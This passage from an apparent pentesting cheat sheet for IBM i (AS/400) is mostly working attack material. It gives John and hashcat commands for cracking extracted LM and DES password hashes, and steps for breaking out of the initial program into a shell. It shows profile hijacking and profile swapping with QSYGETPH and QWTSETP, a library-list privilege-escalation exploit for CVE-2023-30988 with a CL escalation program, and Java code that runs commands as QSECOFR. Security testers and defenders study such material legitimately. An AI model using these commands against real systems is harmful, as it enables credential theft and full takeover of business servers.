<td>8</td>
<td>CHAR(10)</td>
<td>User profile name</td>
</tr>
<tr>
<td>18</td>
<td>12</td>
<td>CHAR(*)</td>
<td>Encrypted user password data</td>
</tr>
</tbody>
</table>
<p><strong>Encrypted password data</strong> hex string</p>
<table>
<thead>
<tr>
<th>Offset (Dec)</th>
<th>Length (Chars)</th>
<th>Field</th>
<th>QPWDLVL</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>16</td>
<td>DES 56-bit encrypted password substitute (RFC2877)</td>
<td>0, 1, 2*</td>
</tr>
<tr>
<td>16</td>
<td>16</td>
<td>DES 56-bit encrypted password substitute (RFC2877)</td>
<td>0, 1, 2*</td>
</tr>
<tr>
<td>32</td>
<td>32</td>
<td>LM hash</td>
<td>0, 1, 2*</td>
</tr>
<tr>
<td>64</td>
<td>4</td>
<td>No data</td>
<td></td>
</tr>
<tr>
<td>68</td>
<td>40</td>
<td>HMAC-SHA1 encrypted password token (RFC4777)?</td>
<td>0<strong>, 1</strong>, 2, 3</td>
</tr>
<tr>
<td>108</td>
<td>40</td>
<td>HMAC-SHA1 encrypted password token (RFC4777)?</td>
<td>0<strong>, 1</strong>, 2, 3</td>
</tr>
<tr>
<td>148</td>
<td>6</td>
<td>No data</td>
<td></td>
</tr>
<tr>
<td>154</td>
<td>384</td>
<td>Unknown (hash?) data</td>
<td>0, 1, 2, 3</td>
</tr>
</tbody>
</table>
<p>If the machine is still using the <code>QPWDLVL &lt; 3</code>, then an attacker can still recover DES and LM hashes.</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>John</th>
</tr>
</thead>
<tbody>
<tr>
<td>LM</td>
<td><code>john --format=LM {filename}</code></td>
</tr>
<tr>
<td>IBM DES</td>
<td><code>john --format=as400-des {filename}</code></td>
</tr>
<tr>
<td>SHA1 Uppercase</td>
<td><code>john --format=as400-ssha1 {filename}</code></td>
</tr>
</tbody>
</table>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c"># Hashcat command for LM hashes</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="p">.\</span><span class="n">hashcat</span><span class="p">.</span><span class="n">exe</span>  <span class="n">-m</span> <span class="n">3000</span> <span class="n">-a</span> <span class="n">3</span> <span class="p">-</span><span class="n">-increment</span> <span class="p">-</span><span class="n">-username</span> <span class="p">-</span><span class="n">1</span> <span class="k">?</span><span class="n">u</span><span class="k">?</span><span class="n">d</span><span class="k">?</span><span class="n">s</span> <span class="p">.\</span><span class="n">hashes</span><span class="p">.</span><span class="n">txt</span> <span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span><span class="k">?</span><span class="n">1</span>
</code></pre></div>
<ul>
<li><a href="https://github.com/willstruggle/john/blob/master/ibmiscanner2john.py">willstruggle/ibmiscanner2john.py</a> - Convert files in format userid:hash (e.g files produced by older versions of the ibmiscanner tool) to the as400-sha format that can be processed by JtR</li>
<li><a href="https://web.archive.org/web/20170224172524/http://www.hackthelegacy.org/attachments/pwd400gen.py">hackthelegacy/pwd400gen.py</a> - Password hash generator for IBM Power Systems</li>
</ul>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="initial-program-breakout">Initial Program Breakout</h3>
<ul>
<li>Click "<code>Attn</code>" button. The attention interrupt key (ATTN) allows the authenticated user to interrupt/end a process and display a menu with additional functions.</li>
<li>Press <code>F9</code> to run commands</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c"># Spawn a PASE shell</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">CALL</span> <span class="n">QP2TERM</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c"># Execute a script</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">CALL</span> <span class="n">QP2SHELL</span> <span class="n">PARM</span><span class="p">(</span><span class="s1">&#39;/QOpenSys/usr/bin/sh&#39;</span> <span class="p">+</span> <span class="s1">&#39;/tmp/scr&#39;</span><span class="p">)</span>
</code></pre></div>
<h3 id="hijack-profile-secofr-security-class">Hijack Profile - SECOFR Security Class</h3>
<p>User profiles assigned with the <code>*SECOFR</code> (Security Officer) security class are automatically granted <code>*ALLOBJ</code> (All Object) authority, giving them unrestricted access to all system objects. Refer to <a href="#user-class">User Class</a></p>
<p>Display a user profile in several different formats with <code>DSPUSRPRF</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">DSPUSRPRF</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span>
</code></pre></div>
<p>The user submitting this must have <code>*ALLOBJ</code> and <code>*JOBCTL</code> authority.</p>
<ul>
<li>
<p>Submitting a Job as <code>&lt;USERNAME&gt;</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">SBMJOB</span> <span class="n">CMD</span><span class="p">(</span><span class="n">DSPJOB</span><span class="p">)</span> <span class="n">JOB</span><span class="p">(</span><span class="n">TESTJOB</span><span class="p">)</span> <span class="n">USER</span><span class="p">(&lt;</span><span class="n">USERNAME</span><span class="p">&gt;)</span>
</code></pre></div>
</li>
<li>
<p>Then check the job log:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">WRKJOB</span> <span class="n">TESTJOB</span>
</code></pre></div>
</li>
</ul>
<h3 id="hijack-profile-authorities">Hijack Profile - Authorities</h3>
<ul>
<li>
<p>Print Public Authority: any user profiles have authority that is not set to the default of <code>*PUBLIC AUT(*EXCLUDE)</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">PRTPUBAUT</span> <span class="n">OBJTYPE</span><span class="p">(*</span><span class="n">USRPRF</span><span class="p">)</span>
</code></pre></div>
</li>
<li>
<p>Print Private Authority</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="n">PRTPVTAUT</span> <span class="n">OBJTYPE</span><span class="p">(*</span><span class="n">USRPRF</span><span class="p">)</span>
</code></pre></div>
</li>
</ul>
<p>Look for <code>*USE</code> rights or better(e.g. <code>*CHANGE</code>, <code>*ALL</code>) to someone else's User Profile.</p>
<p>This <code>SBMJOB</code> command will submit a batch job to run under the <code>HIJACKED_USER</code> user profile, and will print out the records in the <code>FILE_OF_HIJACKED_USER</code> file where the <code>HIJACKED_USER</code> User Profile have access.</p>
<blockquote>
<p>The Submit Job (SBMJOB) command allows a job that is running to submit another job to a job queue to be run later as a batch job. Only one element of request data can be placed on the new job's message queue. - <a href="https://www.ibm.com/docs/en/i/7.4?topic=ssw_ibm_i_74/cl/sbmjob.html">IBM/SBMJOB</a></p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">SBMJOB</span> <span class="n">CMD</span><span class="p">(</span><span class="n">CPYF</span> <span class="n">FROMFILE</span><span class="p">(</span><span class="n">FILE_OF_HIJACKED_USER</span><span class="p">)</span> <span class="n">TOFILE</span><span class="p">(*</span><span class="n">PRINT</span><span class="p">))</span> <span class="n">USER</span><span class="p">(</span><span class="n">HIJACKED_USER</span><span class="p">)</span>
</code></pre></div>
<h3 id="hijack-profile-profile-swapping">Hijack Profile - Profile Swapping</h3>
<p>Used to change the thread user profile running the application in order to obtain elevated authority.</p>
<ul>
<li>Check the list of profiles</li>
<li>Grab a profile handle: <a href="https://www.ibm.com/docs/api/v1/content/ssw_ibm_i_75/apis/QSYGETPH.htm"><code>QSYGETPH</code></a></li>
<li>Set profile based on the token generated by QSYGETPH: <a href="https://www.ibm.com/docs/api/v1/content/ssw_ibm_i_75/apis/QWTSETP.htm"><code>QWTSETP</code></a></li>
<li>Repeat until you have obtained the highest access level</li>
<li>Release profile handle: <a href="https://www.ibm.com/docs/api/v1/content/ssw_ibm_i_75/apis/QSYRLSPH.htm"><code>QSYRLSPH</code></a></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="cm">/* Call QSYGETPH to get a profile handle for a user. */</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="cm">/* NOTE: Change USERPROFILE to the user who you want to swap to. */</span>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="n">CALL</span><span class="w"> </span><span class="n">QSYS</span><span class="o">/</span><span class="n">QSYGETPH</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;</span><span class="n">USERPROFILE</span><span class="sc">&#39; &#39;</span><span class="o">*</span><span class="n">NOPWDCHK</span><span class="err">&#39;</span><span class="w"> </span><span class="o">&amp;</span><span class="n">HNDL</span><span class="p">)</span>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="cm">/* Call QWTSETP to swap to the profile. */</span>
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="n">CALL</span><span class="w"> </span><span class="n">QSYS</span><span class="o">/</span><span class="n">QWTSETP</span><span class="w"> </span><span class="o">&amp;</span><span class="n">HNDL</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*NOPWD</code></td>
<td>The user requesting the profile handle must have <code>*USE</code> authority to the user profile. A profile handle does not get created for a disabled user profile. A profile handle does not get created for a user profile with an expired password.</td>
</tr>
<tr>
<td><code>*NOPWDCHK</code></td>
<td>The user requesting the profile handle must have <code>*USE</code> authority to the user profile. If the profile is disabled, the user requesting the profile handle must have <code>*ALLOBJ</code> and <code>*SECADM</code> special authorities to get a handle. If the password is expired, the user requesting the profile handle must have <code>*ALLOBJ</code> and <code>*SECADM</code> special authorities to get a handle.</td>
</tr>
<tr>
<td><code>*NOPWDSTS</code></td>
<td>The user requesting the profile handle must have *USE authority to the user profile. A profile handle does not get created for a disabled user profile. If the password is expired, the user requesting the profile handle must have <code>*ALLOBJ</code> and <code>*SECADM</code> special authorities to get a handle.</td>
</tr>
</tbody>
</table>
<p>You cannot obtain a profile handle for the following system-supplied user profiles:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">QAUTPROF</span>  <span class="n">QDLFM</span>       <span class="n">QMSF</span>      <span class="n">QSNADS</span>      <span class="n">QTSTRQS</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">QCLUMGT</span>   <span class="n">QDOC</span>        <span class="n">QNETSPLF</span>  <span class="n">QSPL</span>
<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">QCOLSRV</span>   <span class="n">QDSNX</span>       <span class="n">QNFSANON</span>  <span class="n">QSPLJOB</span>
<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="n">QDBSHR</span>    <span class="n">QFNC</span>        <span class="n">QNTP</span>      <span class="n">QSRVAGT</span>
<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="n">QDBSHRDO</span>  <span class="n">QGATE</span>       <span class="n">QPEX</span>      <span class="n">QSYS</span>
<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="n">QDFTOWN</span>   <span class="n">QLPAUTO</span>     <span class="n">QPM400</span>    <span class="n">QTCP</span> 
<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="n">QDIRSRV</span>   <span class="n">QLPINSTALL</span>  <span class="n">QRJE</span>      <span class="n">QTFTP</span> 
</code></pre></div>
<p><strong>JDBC</strong>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="k">REPLACE</span><span class="w"> </span><span class="k">PROCEDURE</span><span class="w"> </span><span class="n">J_QSYGETPH</span><span class="w"> </span><span class="p">(</span><span class="k">IN</span><span class="w"> </span><span class="n">USERNAME</span><span class="w"> </span><span class="n">VARBINARY</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="n">PASSWORD</span><span class="w"> </span><span class="n">VARBINARY</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span><span class="k">OUT</span><span class="w"> </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">VARBINARY</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span><span class="w"> </span><span class="k">EXTERNAL</span><span class="w"> </span><span class="n">NAME</span><span class="w"> </span><span class="n">QSYS</span><span class="p">.</span><span class="n">QSYGETPH</span><span class="w"> </span><span class="k">LANGUAGE</span><span class="w"> </span><span class="k">C</span><span class="o">++</span><span class="w"> </span><span class="k">GENERAL</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="k">CALL</span><span class="w"> </span><span class="n">J_QSYGETPH</span><span class="p">(</span><span class="s1">&#39;USERPROFILE&#39;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;*NOPWD&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">PROFILE_HANDLE</span><span class="p">)</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="k">REPLACE</span><span class="w"> </span><span class="k">PROCEDURE</span><span class="w"> </span><span class="n">J_QWTSETP</span><span class="w"> </span><span class="p">(</span><span class="k">IN</span><span class="w"> </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">VARBINARY</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span><span class="w"> </span><span class="k">EXTERNAL</span><span class="w"> </span><span class="n">NAME</span><span class="w"> </span><span class="n">QSYS</span><span class="p">.</span><span class="n">QWTSETP</span><span class="w"> </span><span class="k">LANGUAGE</span><span class="w"> </span><span class="k">C</span><span class="o">++</span><span class="w"> </span><span class="k">GENERAL</span>
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="k">CALL</span><span class="w"> </span><span class="n">J_QWTSETP</span><span class="p">(</span><span class="n">PROFILE_HANDLE</span><span class="p">)</span>
</code></pre></div>
<h3 id="unqualified-library-calls">Unqualified Library Calls</h3>
<blockquote>
<p>"applications that use library lists rather than qualified library names have a potential security exposure. A user who is authorized to the commands to work with library lists can potentially run a dierent version of a program." - <a href="https://www.ibm.com/docs/en/i/7.3?topic=security-library-library-lists">ibm.com/security-library-library-lists</a></p>
</blockquote>
<table>
<thead>
<tr>
<th>Code</th>
<th>Check</th>
</tr>
</thead>
<tbody>
<tr>
<td>CALL LIBFOO/OBJBAR</td>
<td>SECURE</td>
</tr>
<tr>
<td>CALL OBJBAR</td>
<td>VULNERABLE</td>
</tr>
</tbody>
</table>
<p><strong>Example</strong>:</p>
<p>CVE-2023-30988: LIBL abuse, PATH abuse on IBM i - Lirbry List Exploitation</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">DSPUSRPRF</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span><span class="w">               </span><span class="c1">-- Display user profile</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="n">CRTLIB</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span><span class="w">                  </span><span class="c1">-- Create library</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="n">STRSEU</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;/</span><span class="n">QCLSRC</span><span class="w"> </span><span class="n">QFQSES</span><span class="w">    </span><span class="c1">-- Show sources of QFQSES, </span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="w">                               </span><span class="c1">-- require to compile it</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="w">                                </span><span class="n">PGM</span>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="w">                                    </span><span class="k">CALL</span><span class="w"> </span><span class="n">QSYS</span><span class="o">/</span><span class="n">QCMD</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="w">                                </span><span class="n">ENDPGM</span>
<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>
<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="n">ADDLIBLE</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span><span class="w">                </span><span class="c1">-- Add user to the libraries</span>
<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="n">DSPAUTUSR</span><span class="w">                      </span><span class="c1">-- Display user profile</span>
<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="k">CALL</span><span class="w"> </span><span class="n">QFAX</span><span class="o">/</span><span class="n">QFFSTRFCPP</span><span class="w"> </span><span class="n">PARM</span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="c1">-- Call the vulnerable program</span>
<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="n">DSPAUTUSR</span><span class="w">                      </span><span class="c1">-- Display user profile, QAUTPROF and QFAXMSF should be available</span>
<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="k">CALL</span><span class="w"> </span><span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;/</span><span class="n">ESCALATE</span><span class="w"> </span><span class="n">QFAXMSF</span><span class="w">   </span><span class="c1">-- Profile swapping</span>
<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="w">                               </span><span class="c1">-- require to compile the ESCALATE program</span>
<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="w">                                </span><span class="n">PGM</span><span class="w"> </span><span class="n">PARM</span><span class="p">(</span><span class="o">&amp;</span><span class="k">USER</span><span class="p">)</span>
<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a><span class="w">                                    </span><span class="n">DCL</span><span class="w"> </span><span class="n">VAR</span><span class="p">(</span><span class="o">&amp;</span><span class="k">USER</span><span class="p">)</span><span class="w"> </span><span class="k">TYPE</span><span class="p">(</span><span class="o">*</span><span class="nb">CHAR</span><span class="p">)</span><span class="w"> </span><span class="n">LEN</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="w">                                    </span><span class="n">DCL</span><span class="w"> </span><span class="n">VAR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">HANDLE</span><span class="p">)</span><span class="w"> </span><span class="k">TYPE</span><span class="p">(</span><span class="o">*</span><span class="nb">CHAR</span><span class="p">)</span><span class="w"> </span><span class="n">LEN</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="w">                                    </span><span class="n">DCL</span><span class="w"> </span><span class="n">VAR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ERROR</span><span class="p">)</span><span class="w"> </span><span class="k">TYPE</span><span class="p">(</span><span class="o">*</span><span class="nb">CHAR</span><span class="p">)</span><span class="w"> </span><span class="n">LEN</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a><span class="w">                                    </span><span class="n">CHGVAR</span><span class="w"> </span><span class="n">VAR</span><span class="p">(</span><span class="o">%</span><span class="n">BIN</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ERROR</span><span class="p">))</span><span class="w"> </span><span class="n">VALUE</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a><span class="w">                                    </span><span class="k">CALL</span><span class="w"> </span><span class="n">PGM</span><span class="p">(</span><span class="n">QSYGETPH</span><span class="p">)</span><span class="w"> </span><span class="n">PARM</span><span class="p">(</span><span class="o">&amp;</span><span class="k">USER</span><span class="w"> </span><span class="o">*</span><span class="n">NOPWD</span><span class="w"> </span><span class="o">&amp;</span><span class="n">HANDLE</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ERROR</span><span class="p">)</span>
<a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a><span class="w">                                    </span><span class="n">CHGVAR</span><span class="w"> </span><span class="n">VAR</span><span class="p">(</span><span class="o">%</span><span class="n">BIN</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ERROR</span><span class="p">))</span><span class="w"> </span><span class="n">VALUE</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="w">                                    </span><span class="k">CALL</span><span class="w"> </span><span class="n">PGM</span><span class="p">(</span><span class="n">QWTSETP</span><span class="p">)</span><span class="w"> </span><span class="n">PARM</span><span class="p">(</span><span class="o">&amp;</span><span class="n">HANDLE</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ERROR</span><span class="p">)</span>
<a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a><span class="w">                                </span><span class="n">ENDPGM</span>
<a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a>
<a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a><span class="n">DSPAUTUSR</span><span class="w">                      </span><span class="c1">-- Should display all profiles</span>
<a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a><span class="w">                               </span><span class="c1">-- QFAXMSF has *ALLOBJ</span>
</code></pre></div>
<h3 id="from-allobj-to-secadm">From ALLOBJ to SECADM</h3>
<ul>
<li>
<p>Query users informations:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">DSPUSRPRF</span><span class="w"> </span><span class="n">USRPRF</span><span class="p">(</span><span class="o">*</span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="n">TYPE</span><span class="p">(</span><span class="o">*</span><span class="n">BASIC</span><span class="p">)</span><span class="w"> </span><span class="n">OUTPUT</span><span class="p">(</span><span class="o">*</span><span class="n">OUTFILE</span><span class="p">)</span><span class="w"> </span><span class="n">OUTFILE</span><span class="p">(</span><span class="n">PENTEST</span><span class="o">/</span><span class="n">USERDB</span><span class="p">)</span>
</code></pre></div>
</li>
<li>
<p>Create a CL script to escalate privilege and compile it with <code>STRPDM</code> (output is <code>PRIVESC</code>)</p>
</li>
<li>Call the generated PGM (program object): <code>CALL PENTEST/PRIVESC USERWITHSECADM</code></li>
</ul>
<h3 id="arbitrary-command-execution">Arbitrary Command Execution</h3>
<ul>
<li>
<p>QSECOFR user - Compile as <code>.jar</code> file and run inside QSH: <code>java -jar /home/user/exploit.jar</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1">// Triggering with JTOpen</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="n">sPGMCall</span><span class="p">.</span><span class="na">setProgram</span><span class="p">(</span><span class="s">&quot;/QSYS.LIB/QLWIUTIL4.SRVPGM&quot;</span><span class="p">);</span>
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;`id&gt;/tmp/xy.txt`&quot;</span><span class="p">;</span><span class="w"> </span><span class="c1">// command execution with QSECOFR</span>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="n">ProgramParameter</span><span class="o">[]</span><span class="w"> </span><span class="n">programParameterArr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">ProgramParameter</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AS400Text</span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">system</span><span class="p">).</span><span class="na">toBytes</span><span class="p">(</span><span class="n">str</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="mi">0</span><span class="p">)),</span>
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">ProgramParameter</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="mi">16384</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="mi">16384</span><span class="p">)</span><span class="w"> </span><span class="c1">// hatmanager.jar</span>
<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="p">};</span>
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="n">sPGMCall</span><span class="p">.</span><span class="na">setParameterList</span><span class="p">(</span><span class="n">programParameterArr</span><span class="p">);</span>
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="n">sPGMCall</span><span class="p">.</span><span class="na">setProcedureName</span><span class="p">(</span><span class="s">&quot;QlwiRelayCall&quot;</span><span class="p">);</span>
</code></pre></div>
</li>
<li>
<p>QSECOFR user - CVE-2023-40685</p>
</li>
<li>QDIRSRV user - CVE-2023-40378</li>
<li>QYPSJSVR user - CVE-2023-40686</li>
<li>QBRMS user - CVE-2023-40377</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://blog.silentsignal.eu/2023/01/20/abusing-adopted-authority-on-ibm-i/">Abusing Adopted Authority on IBM i - Zoltán Pánczél - January 20, 2023</a></li>
<li><a href="https://www.ibm.com/support/pages/adopted-authority">Adopted Authority - IBM Support - October 3, 2024</a></li>
<li><a href="https://www.fortra.com/blog/ibm-i-hacking-tale">An IBM i Hacking Tale - Pablo Zurro - April 6, 2023</a></li>
<li><a href="https://blog.silentsignal.eu/2022/09/28/another-tale-of-ibm-i-as-400-hacking/">Another Tale of IBM i (AS/400) Hacking - Zoltán Pánczél - September 28, 2022</a></li>
<li><a href="https://www.blackhat.com/presentations/bh-europe-06/bh-eu-06-Carmel/bh-eu-06-Carmel.pdf">AS/400 for pentesters - Black Hat Europe 2006 - Shalom Carmel</a></li>
<li><a href="https://github.com/samanL33T/Awesome-Mainframe-Hacking">Awesome-Mainframe-Hacking - samanL33T - July 10, 2019</a></li>
<li><a href="https://silentsignal.github.io/BelowMI/">Below MI - IBM i for Hackers - Silent Signal - August 22, 2024</a></li>
<li><a href="https://www.securemyi.com/nl/articles/userclass.html">Common Misconcepts on IBM i User Class - *SECOFR - Dan Riehl - September 12, 2013</a></li>
<li><a href="https://github.com/FrenchIBMi/Clubs/">FrenchIBMi - Christian Massé - March 15, 2017</a></li>
<li><a href="https://web.archive.org/web/20210831231128/https://blog.grimm-co.com/2021/07/geeking-out-on-ibm-i-part-1.html">Geeking Out On IBM i - Part 1 - Anonymous - August 31, 2021</a></li>
<li><a href="https://www.itjungle.com/2022/05/23/guru-ibm-i-usrprf-security/">Guru: IBM i *USRPRF Security - Bruce Bading - May 23, 2022</a></li>
<li><a href="https://youtu.be/JsqUZ3xGdLc">Hack the Legacy: IBM I aka AS400 Revealed - Bart Kulach - December 25, 2015</a></li>
<li><a href="https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEF%20CON%2023%20-%20Bart-Kulach-Hack-the-Legacy-IBMi-revealed.pdf">Hack the legacy! IBM i (aka AS/400) revealed - Bart Kulach - May 11, 2021</a></li>
<li><a href="https://www.securitum.com/hacking_ibm_as400_in_2024.html">Hacking IBM AS/400 in 2024: QShell and Remote Code Execution - Mateusz Lewczak - October 04, 2024</a></li>
<li><a href="https://fossies.org/linux/john/doc/README.IBM_AS400">How to get &amp; crack AS/400 hashes? - Fossies - November 7, 2017</a></li>
